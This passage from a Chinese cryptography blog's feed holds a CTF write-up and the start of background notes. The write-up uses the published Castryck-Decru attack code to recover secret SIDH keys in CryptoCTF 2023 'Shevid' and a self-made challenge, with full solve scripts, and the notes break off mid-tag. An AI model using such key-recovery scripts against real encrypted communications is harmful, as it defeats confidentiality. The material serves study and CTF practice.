      <title>同源（2）——SIDH通解</title>
      <link href="/2025/03/03/%E5%90%8C%E6%BA%90%EF%BC%882%EF%BC%89%E2%80%94%E2%80%94SIDH%E9%80%9A%E8%A7%A3/"/>
      <url>/2025/03/03/%E5%90%8C%E6%BA%90%EF%BC%882%EF%BC%89%E2%80%94%E2%80%94SIDH%E9%80%9A%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考资料：<a href="https://eprint.iacr.org/2022/975">An efficient key recovery attack on SIDH</a></p></blockquote><p>前文再续，书接<a href="https://triodelzx.github.io/2025/02/26/同源（1）——SIDH/">上一回</a>，上回讲到，SIDH喺2022年就被宣布畀人完全破解咗……</p><h2 id="前言">前言</h2><p>本来没想过写这一篇的，因为‘本来想着既然都有现成代码了，那用起来应该会很方便吧，但是在NSS上刷题的时候做到CryptoCTF 2023的一道题：<a href="https://www.nssctf.cn/problem/4387">[CryptoCTF 2023]Shevid | NSSCTF</a>，其实就是SIDH中已知Alice私钥以及双方公钥来恢复Bob私钥，但是在用<a href="https://github.com/GiacomoPope/Castryck-Decru-SageMath">GiacomoPope/Castryck-Decru-SageMath: A SageMath implementation of the Castryck-Decru Key Recovery attack on SIDH</a>给出的代码时四处碰壁，所以想着写这篇博客记录一下如何使用这些代码。</p><h2 id="对sidh的破解">对SIDH的破解</h2><p><del>有现成代码，原理似乎也不是很重要</del> 大致扫了一眼论文和GitHub项目上的样例代码（<a href="https://github.com/GiacomoPope/Castryck-Decru-SageMath/blob/main/baby_SIDH.sage">baby_SIDH.sage</a>），发现我们要做的似乎其实仅仅是需要构造一个曲线上的自同态<span class="math inline">\([2i]\)</span>，使得<span class="math inline">\([2i]\circ[2i]=[-4]\)</span>（实际上就是<span class="math inline">\(2i\)</span>倍点映射吧，但是sage并不能直接给<span class="math inline">\(GF(p^2)\)</span>上的点乘上<span class="math inline">\(2i\)</span>），所以这个过程其实要我们自己写，但是在Github的项目里面其实是有给由方程<span class="math inline">\(y^2=x^3+6x^2+x\)</span>所定义的椭圆曲线上的<span class="math inline">\(2i\)</span>倍点映射的算法，而通过阅读论文，我们也可以写出由方程<span class="math inline">\(y^2=x^3+x\)</span>所定义的椭圆曲线上的<span class="math inline">\(2i\)</span>倍点映射：<span class="math inline">\([2i]:(x,y)\mapsto[2](-x,iy)\)</span>（其中<span class="math inline">\([2]\)</span>为二倍点映射），在论文里面也只讨论了这两种方程定义的曲线。</p><h3 id="代码使用实例">代码使用实例</h3><p>在这里通过两个例子来公式化地使用Github项目中给出的代码解决分别由<span class="math inline">\(y^2=x^3+6x^2+x\)</span>与<span class="math inline">\(y^2=x^3+x\)</span>定义的曲线上的SIDH：</p><h4 id="cryptoctf-2023shevid">[CryptoCTF 2023]Shevid</h4><p>题目给出代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5  </span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_param</span>(<span class="params">B</span>):  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">       a = randint(B &gt;&gt; <span class="number">1</span>, B)  </span><br><span class="line">       b = randint(B &gt;&gt; <span class="number">2</span>, B &gt;&gt; <span class="number">1</span>)  </span><br><span class="line">       p = <span class="number">2</span>**a * <span class="number">3</span>**b - <span class="number">1</span>  </span><br><span class="line">       <span class="keyword">if</span> is_prime(p):  </span><br><span class="line">          <span class="keyword">return</span> a, b  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_dmap</span>(<span class="params">E</span>):  </span><br><span class="line">    <span class="keyword">return</span> E.isogeny(E.lift_x(ZZ(<span class="number">1</span>)), codomain = E)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_tpt</span>(<span class="params">E, a, b</span>):  </span><br><span class="line">    P, Q = [((p + <span class="number">1</span>) // <span class="number">2</span>**a) * _ <span class="keyword">for</span> _ <span class="keyword">in</span> E.gens()]  </span><br><span class="line">    R, S = [((p + <span class="number">1</span>) // <span class="number">3</span>**b) * _ <span class="keyword">for</span> _ <span class="keyword">in</span> E.gens()]  </span><br><span class="line">    <span class="keyword">return</span> P, Q, R, S  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">EC, b, P, Q, R, S</span>):  </span><br><span class="line">    skey = randint(<span class="number">1</span>, <span class="number">3</span>**b)  </span><br><span class="line">    T = R + skey * S  </span><br><span class="line">    phi = EC.isogeny(T, algorithm = <span class="string">&quot;factored&quot;</span>)  </span><br><span class="line">    _phi_dom, _phi_P, _phi_Q = phi.codomain(), phi(P), phi(Q)  </span><br><span class="line">    <span class="keyword">return</span> skey, _phi_dom, _phi_P, _phi_Q  </span><br><span class="line">  </span><br><span class="line">a, b = gen_param(<span class="number">190</span>)  </span><br><span class="line">p = <span class="number">2</span>**a * <span class="number">3</span>**b - <span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">F.&lt;x&gt; = GF(p^<span class="number">2</span>, modulus = x**<span class="number">2</span> + <span class="number">1</span>)  </span><br><span class="line">EC = EllipticCurve(F, [<span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])  </span><br><span class="line">P, Q, R, S = gen_tpt(EC, a, b)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;P = <span class="subst">&#123;P.xy()&#125;</span>&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Q = <span class="subst">&#123;Q.xy()&#125;</span>&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;R = <span class="subst">&#123;R.xy()&#125;</span>&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;S = <span class="subst">&#123;S.xy()&#125;</span>&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">skey, _phi_dom, _phi_P, _phi_Q = keygen(EC, b, P, Q, R, S)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;_phi_dom = <span class="subst">&#123;_phi_dom&#125;</span>&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;_phi_P   = <span class="subst">&#123;_phi_P.xy()&#125;</span>&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;_phi_Q   = <span class="subst">&#123;_phi_Q.xy()&#125;</span>&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">key = md5(long_to_bytes(skey)).digest()  </span><br><span class="line">iv = md5(<span class="built_in">str</span>(skey).encode()).digest()  </span><br><span class="line">  </span><br><span class="line">cipher = AES.new(key, AES.MODE_CFB, iv=iv)  </span><br><span class="line">enc = cipher.encrypt(flag)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc = <span class="subst">&#123;enc.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure> 其实就是要我们通过Alice的公开点<span class="math inline">\(P,Q\)</span>和Bob的公钥<span class="math inline">\((\phi(E),\phi(P),\phi(Q))\)</span>还原Bob的秘密值<span class="math inline">\(k_B\)</span>，这里定义的曲线是由<span class="math inline">\(y^2=x^3+6x^2+x\)</span>所定义的，所以我们可以用<code>public_values_aux.py</code>中的<code>generate_distortion_map</code>函数来计算该曲线上的<span class="math inline">\([2i]\)</span>，那么可以写出代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> public_values_aux <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">load(<span class="string">&#x27;castryck_decru_shortcut.sage&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = ...</span><br><span class="line">Fd.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">E = EllipticCurve(Fd, [<span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">E.set_order((p+<span class="number">1</span>)^<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="number">142</span></span><br><span class="line">b = <span class="number">69</span></span><br><span class="line"></span><br><span class="line">a2 = <span class="number">6</span></span><br><span class="line">a4 = <span class="number">2070374075904221348548347954672740119972290047985052548426161483408084160515</span>*i+<span class="number">896749506444795652787374405713981306103783874504413776724865996633074195878</span></span><br><span class="line">a6 = <span class="number">2497300913991521538985990865799426081199023429830552981773916386651958830387</span>*i+<span class="number">4243320791854592301388975795466391442631117041175807728844738724691845270777</span></span><br><span class="line"></span><br><span class="line">_phi_dom = EllipticCurve(Fd, [<span class="number">0</span>, a2, <span class="number">0</span>, a4, a6])</span><br><span class="line"></span><br><span class="line">_phi_P = _phi_dom(...)</span><br><span class="line">_phi_Q = _phi_dom(...)</span><br><span class="line"></span><br><span class="line">P2 = E(...)</span><br><span class="line">Q2 = E(...)</span><br><span class="line">P3 = E(...)</span><br><span class="line">Q3 = E(...)</span><br><span class="line">two_i = generate_distortion_map(E)</span><br><span class="line">check_torsion_points(E, a, b, P2, Q2, P3, Q3)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;...&quot;</span></span><br><span class="line"></span><br><span class="line">recovered_key = CastryckDecruAttack(E, P2, Q2, _phi_dom, _phi_P, _phi_Q, two_i, num_cores=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">key = md5(long_to_bytes(<span class="built_in">int</span>(recovered_key))).digest()</span><br><span class="line">iv = md5(<span class="built_in">str</span>(recovered_key).encode()).digest()</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_CFB, iv=iv)</span><br><span class="line">flag = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(enc))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure> 注意，这里的<code>P2,Q2,P3,Q3</code>分别对应的是题目代码中的<code>P,Q,R,S</code>，我们可以修改函数<code>CastryckDecruAttack</code>中的<code>num_cores</code>参数可以改变并行进程数，从而提高运行效率，开4个线程运行结果如下图所示： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202503032230423.png" alt="Pasted image 20250303200634" /></p><h4 id="一道自制题">一道自制题</h4><p>找不到<span class="math inline">\(y^2=x^3+x\)</span>的题目，自己出一道举个例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;Aurora&#123;Test_Flag_for_Isogeny_with_y^2=x^3+x&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_param</span>(<span class="params">B</span>):  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">       a = randint(B &gt;&gt; <span class="number">1</span>, B)  </span><br><span class="line">       b = randint(B &gt;&gt; <span class="number">2</span>, B &gt;&gt; <span class="number">1</span>)  </span><br><span class="line">       p = <span class="number">2</span>**a * <span class="number">3</span>**b - <span class="number">1</span>  </span><br><span class="line">       <span class="keyword">if</span> is_prime(p):  </span><br><span class="line">          <span class="keyword">return</span> a, b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_tpt</span>(<span class="params">E, a, b</span>):  </span><br><span class="line">    P, Q = [((p + <span class="number">1</span>) // <span class="number">2</span>**a) * _ <span class="keyword">for</span> _ <span class="keyword">in</span> E.gens()]  </span><br><span class="line">    R, S = [((p + <span class="number">1</span>) // <span class="number">3</span>**b) * _ <span class="keyword">for</span> _ <span class="keyword">in</span> E.gens()]  </span><br><span class="line">    <span class="keyword">return</span> P, Q, R, S  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">shared_key, plaintext</span>):</span><br><span class="line">    key = sha256(<span class="built_in">str</span>(shared_key).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(pad(plaintext, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">a, b = gen_param(<span class="number">64</span>)</span><br><span class="line">p = <span class="number">2</span>**a * <span class="number">3</span>**b - <span class="number">1</span></span><br><span class="line">F.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(F, [<span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">P1, Q1, P2, Q2 = gen_tpt(E, a, b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;P1 = E<span class="subst">&#123;P1.xy()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Q1 = E<span class="subst">&#123;Q1.xy()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;P2 = E<span class="subst">&#123;P2.xy()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Q2 = E<span class="subst">&#123;Q2.xy()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alice</span></span><br><span class="line">ka = randint(<span class="number">1</span>, <span class="number">2</span>**a)</span><br><span class="line">RA = P1 + ka * Q1</span><br><span class="line">phiA = E.isogeny(RA, algorithm=<span class="string">&#x27;factored&#x27;</span>)</span><br><span class="line"></span><br><span class="line">EA = phiA.codomain()</span><br><span class="line">phiA_P2 = phiA(P2)</span><br><span class="line">phiA_Q2 = phiA(Q2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;EA = <span class="subst">&#123;phiA.codomain()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;phiA_P2 = EA<span class="subst">&#123;phiA_P2.xy()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;phiA_Q2 = EA<span class="subst">&#123;phiA_Q2.xy()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bob</span></span><br><span class="line">kb = randint(<span class="number">1</span>, <span class="number">3</span>**b)</span><br><span class="line">RB = P2 + kb * Q2</span><br><span class="line">phiB = E.isogeny(RB, algorithm=<span class="string">&#x27;factored&#x27;</span>)</span><br><span class="line"></span><br><span class="line">EB = phiB.codomain()</span><br><span class="line">phiB_P1 = phiB(P1)</span><br><span class="line">phiB_Q1 = phiB(Q1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;EB = <span class="subst">&#123;phiB.codomain()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;phiB_P1 = EB<span class="subst">&#123;phiB_P1.xy()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;phiB_Q1 = EB<span class="subst">&#123;phiB_Q1.xy()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">RA1 = phiB_P1 + ka * phiB_Q1</span><br><span class="line">shared1 = EB.isogeny(RA1, algorithm=<span class="string">&#x27;factored&#x27;</span>).codomain().j_invariant()</span><br><span class="line"></span><br><span class="line">RB1 = phiA_P2 + kb * phiA_Q2</span><br><span class="line">shared2 = EA.isogeny(RB1, algorithm=<span class="string">&#x27;factored&#x27;</span>).codomain().j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> shared1 == shared2</span><br><span class="line">shared_key = shared1</span><br><span class="line"></span><br><span class="line">enc = encrypt(shared_key, flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc = <span class="subst">&#123;enc.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p = 69007679864054552199167 </span></span><br><span class="line"><span class="string">a = 41 </span></span><br><span class="line"><span class="string">b = 22 </span></span><br><span class="line"><span class="string">P1 = E(42941883561232695204126*i + 41565179451593292417697, 32012113025288545049970*i + 67447792731782782239107) </span></span><br><span class="line"><span class="string">Q1 = E(25302850366663243334175*i + 28499745867760697777766, 45519069949265761361669*i + 38091523002955621484376) </span></span><br><span class="line"><span class="string">P2 = E(64295307603787694858622*i + 23124820300292317471971, 56390657452217097859549*i + 36392449137376185120691) </span></span><br><span class="line"><span class="string">Q2 = E(5592769293100950710186*i + 10812888045531269729601, 6826865383103204422537*i + 20863179574507545233583) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EA = Elliptic Curve defined by y^2 = x^3 + (55136237696257287853765*i+57833844773073644952221)*x + (52942153600632609877190*i+15361822390228021806871) over Finite Field in i of size 69007679864054552199167^2 </span></span><br><span class="line"><span class="string">phiA_P2 = EA(62489625132170888252802*i + 63808521833396900819332, 49433807014900669675197*i + 38317557157701506341329) </span></span><br><span class="line"><span class="string">phiA_Q2 = EA(3850966740889085851852*i + 45392830987593111886391, 14326935923982120143676*i + 32443933495898500654626) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EB = Elliptic Curve defined by y^2 = x^3 + (535570609910458761019*i+55847628242608619214131)*x + (52895838204408953951990*i+40402487899485896459107) over Finite Field in i of size 69007679864054552199167^2 </span></span><br><span class="line"><span class="string">phiB_P1 = EB(67880173178064709758833*i + 5128007695857513878729, 67090026125242047708224*i + 36228875668588115708933) </span></span><br><span class="line"><span class="string">phiB_Q1 = EB(42637972539717898085377*i + 30589197453944790040489, 62900893992599911017947*i + 53504295506770245599626) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">enc = c63958e914ecac186888aa578719cc8e21bd3f1df3eba0a36dee5a425e487db180f52502552e19495ca7fdf0071fe8cb</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure> 可以通过如下代码来获得flag： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> public_values_aux <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">load(<span class="string">&#x27;castryck_decru_shortcut.sage&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">two_i</span>(<span class="params">P</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    <span class="keyword">if</span> P == E(<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> E(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y = P.xy()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*E(-x, i*y)</span><br><span class="line"></span><br><span class="line">p = <span class="number">69007679864054552199167</span></span><br><span class="line">a = <span class="number">41</span></span><br><span class="line">b = <span class="number">22</span></span><br><span class="line"></span><br><span class="line">F.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">E = EllipticCurve(F, [<span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">P2 = E(<span class="number">42941883561232695204126</span>*i + <span class="number">41565179451593292417697</span>, <span class="number">32012113025288545049970</span>*i + <span class="number">67447792731782782239107</span>)</span><br><span class="line">Q2 = E(<span class="number">25302850366663243334175</span>*i + <span class="number">28499745867760697777766</span>, <span class="number">45519069949265761361669</span>*i + <span class="number">38091523002955621484376</span>)</span><br><span class="line">P3 = E(<span class="number">64295307603787694858622</span>*i + <span class="number">23124820300292317471971</span>, <span class="number">56390657452217097859549</span>*i + <span class="number">36392449137376185120691</span>)</span><br><span class="line">Q3 = E(<span class="number">5592769293100950710186</span>*i + <span class="number">10812888045531269729601</span>, <span class="number">6826865383103204422537</span>*i + <span class="number">20863179574507545233583</span>)</span><br><span class="line">check_torsion_points(E, a, b, P2, Q2, P3, Q3)</span><br><span class="line"></span><br><span class="line">EA = EllipticCurve(F, [<span class="number">55136237696257287853765</span>*i+<span class="number">57833844773073644952221</span>, <span class="number">52942153600632609877190</span>*i+<span class="number">15361822390228021806871</span>])</span><br><span class="line">phiA_P3 = EA(<span class="number">62489625132170888252802</span>*i + <span class="number">63808521833396900819332</span>, <span class="number">49433807014900669675197</span>*i + <span class="number">38317557157701506341329</span>)</span><br><span class="line">phiA_Q3 = EA(<span class="number">3850966740889085851852</span>*i + <span class="number">45392830987593111886391</span>, <span class="number">14326935923982120143676</span>*i + <span class="number">32443933495898500654626</span>)</span><br><span class="line"></span><br><span class="line">EB = EllipticCurve(F, [<span class="number">535570609910458761019</span>*i+<span class="number">55847628242608619214131</span>, <span class="number">52895838204408953951990</span>*i+<span class="number">40402487899485896459107</span>])</span><br><span class="line">phiB_P2 = EB(<span class="number">67880173178064709758833</span>*i + <span class="number">5128007695857513878729</span>, <span class="number">67090026125242047708224</span>*i + <span class="number">36228875668588115708933</span>)</span><br><span class="line">phiB_Q2 = EB(<span class="number">42637972539717898085377</span>*i + <span class="number">30589197453944790040489</span>, <span class="number">62900893992599911017947</span>*i + <span class="number">53504295506770245599626</span>)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;c63958e914ecac186888aa578719cc8e21bd3f1df3eba0a36dee5a425e487db180f52502552e19495ca7fdf0071fe8cb&quot;</span></span><br><span class="line"></span><br><span class="line">kb = CastryckDecruAttack(E, P2, Q2, EB, phiB_P2, phiB_Q2, two_i, num_cores=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">R = phiA_P3 + kb * phiA_Q3</span><br><span class="line">R._order = <span class="number">3</span>^b</span><br><span class="line">phi = EA.isogeny(R, algorithm=<span class="string">&quot;factored&quot;</span>)</span><br><span class="line">shared_key = phi.codomain().j_invariant()</span><br><span class="line"></span><br><span class="line">key = sha256(<span class="built_in">str</span>(shared_key).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(enc))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure> 注意，这里的<code>P2,Q2,P3,Q3</code>对应题目代码中的<code>P1,Q1,P2,Q2</code>，运行结果如下： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202503032231783.png" alt="Pasted image 20250303222653" /></p>]]></content>
      
      
      <categories>
          
          <category> 密码学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同源（1）——SIDH</title>
      <link href="/2025/02/26/%E5%90%8C%E6%BA%90%EF%BC%881%EF%BC%89%E2%80%94%E2%80%94SIDH/"/>
      <url>/2025/02/26/%E5%90%8C%E6%BA%90%EF%BC%881%EF%BC%89%E2%80%94%E2%80%94SIDH/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考资料：</p><ol type="1"><li><p><a href="https://arxiv.org/pdf/1711.04062">Mathematics of Isogeny Based Cryptography</a></p></li><li><p><a href="https://eprint.iacr.org/2019/1321.pdf">Supersingular isogeny key exchange for beginners</a></p></li><li><p><a href="https://link.springer.com/book/10.1007/b97292">Elliptic Curves | SpringerLink</a></p></li><li><p><a href="https://tangcuxiaojikuai.xyz/post/e06139e7.html">Isogeny | 糖醋小鸡块的blog</a></p></li><li><p><a href="https://languag3.github.io/2025/02/04/isogeny/#sidh">isogeny | languag3</a></p></li><li><p><a href="https://huangx607087.online/2025/02/01/ECCNotes4/">ECCNotes4 - huangx607087's Blog</a></p></li></ol></blockquote><h2 id="前置知识">前置知识</h2><h3 id="超奇异supersingular椭圆曲线">超奇异（supersingular）椭圆曲线</h3><p>对于<span class="math inline">\(GF(p^r)\)</span>下的椭圆曲线<span class="math inline">\(E\)</span>，若<span class="math inline">\(|E|\equiv 1\pmod{p}\)</span>，则称该曲线为超奇异椭圆曲线</p><h3 id="j-不变量j-invariant"><span class="math inline">\(j\)</span>-不变量（<span class="math inline">\(j\)</span>-invariant）</h3><p>对于一条由方程<span class="math inline">\(y^2=x^3+ax+b\)</span>定义的椭圆曲线<span class="math inline">\(E\)</span>，其<span class="math inline">\(j\)</span>-不变量的定义为： <span class="math display">\[j(E)=1728\cdot\frac{4a^3}{4a^3+27b^2}\]</span> 当且仅当两条定义在代数闭包<span class="math inline">\(\overline{k}\)</span>上的曲线<span class="math inline">\(E\)</span>与<span class="math inline">\(E&#39;\)</span>的<span class="math inline">\(j\)</span>-不变量相同时这两条曲线同构，即存在点到点之间的双射<span class="math inline">\(\phi\)</span>使得： <span class="math display">\[\phi:E\mapsto E&#39;\]</span> 通过参考资料2我们可以知道对于SIDH，其主要作用于有限域<span class="math inline">\(GF(p)\)</span>的二次扩展（即<span class="math inline">\(GF(p^2)\)</span>，其中<span class="math inline">\(p\equiv 3\pmod{4}\)</span>），方便起见，我们通常将这个二次扩展域中的元素表示为<span class="math inline">\(u+vi\)</span>（其中<span class="math inline">\(u,v\in GF(p)\)</span>，<span class="math inline">\(i^2\equiv-1\pmod{p}\)</span>），定义在这个二次扩展域上的超奇异<span class="math inline">\(j\)</span>-不变量的个数为<span class="math inline">\(\lfloor p/12\rfloor+z\)</span>，这些超奇异<span class="math inline">\(j\)</span>-不变量每一个都对应一条同构意义下的超奇异曲线，其中<span class="math inline">\(z\in\{0,1,2\}\)</span>，<span class="math inline">\(z\)</span>的取值取决于<span class="math inline">\(p\mod 12\)</span>，具体如下（参考资料3，P264）： <span class="math display">\[z=\begin{cases}0&amp;,p\equiv1\pmod{12}\\1&amp;,p\equiv5\pmod{12}\\1&amp;,p\equiv7\pmod{12}\\2&amp;,p\equiv11\pmod{12}\\\end{cases}\]</span> 例如对于参考资料2中的例子（即<span class="math inline">\(p=431\)</span>），<span class="math inline">\(GF(p^2)\)</span>中的<span class="math inline">\(\lfloor p/12\rfloor+2=37\)</span>个<span class="math inline">\(j\)</span>-不变量分别对应一条同构意义下的超奇异曲线，这些<span class="math inline">\(j-\)</span>不变量如下图所示： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202502262006712.png" alt="image-20250226200636189" /> 关于<span class="math inline">\(j\)</span>-不变量与曲线间同构的关系，参考资料2给出了一个例子：对于<span class="math inline">\(GF(431^2)\)</span>下的两条曲线： <span class="math display">\[\begin{aligned}E_1:y^2=x^3+(208i+161)x^2+x\\E_2:y^2=x^3+(172i+162)x^2+x\\\end{aligned}\]</span> 可以计算出<span class="math inline">\(j(E_1)=j(E_2)=364i+304\)</span>，那么我们可以通过如下代码来求出<span class="math inline">\(E_1\)</span>到<span class="math inline">\(E_2\)</span>的同构映射： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">431</span></span><br><span class="line"></span><br><span class="line">R.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus=[<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">E1 = EllipticCurve(R, [<span class="number">0</span>, <span class="number">208</span>*i+<span class="number">161</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">E2 = EllipticCurve(R, [<span class="number">0</span>, <span class="number">172</span>*i+<span class="number">162</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(E1.j_invariant())</span><br><span class="line"><span class="built_in">print</span>(E2.j_invariant())</span><br><span class="line"></span><br><span class="line">phi = E1.isomorphism_to(E2)</span><br><span class="line"><span class="built_in">print</span>(phi.rational_maps())</span><br></pre></td></tr></table></figure> 可以得到： <span class="math display">\[\begin{aligned}\phi:&amp;E_1\mapsto E_2\\&amp;(x,y)\mapsto((66i + 182)x + (-131i + 109), (122i + 159)y)\end{aligned}\]</span></p><h3 id="蒙哥马利montgomery曲线">蒙哥马利（Montgomery）曲线</h3><p>在椭圆曲线密码学中常用的椭圆曲线为形如<span class="math 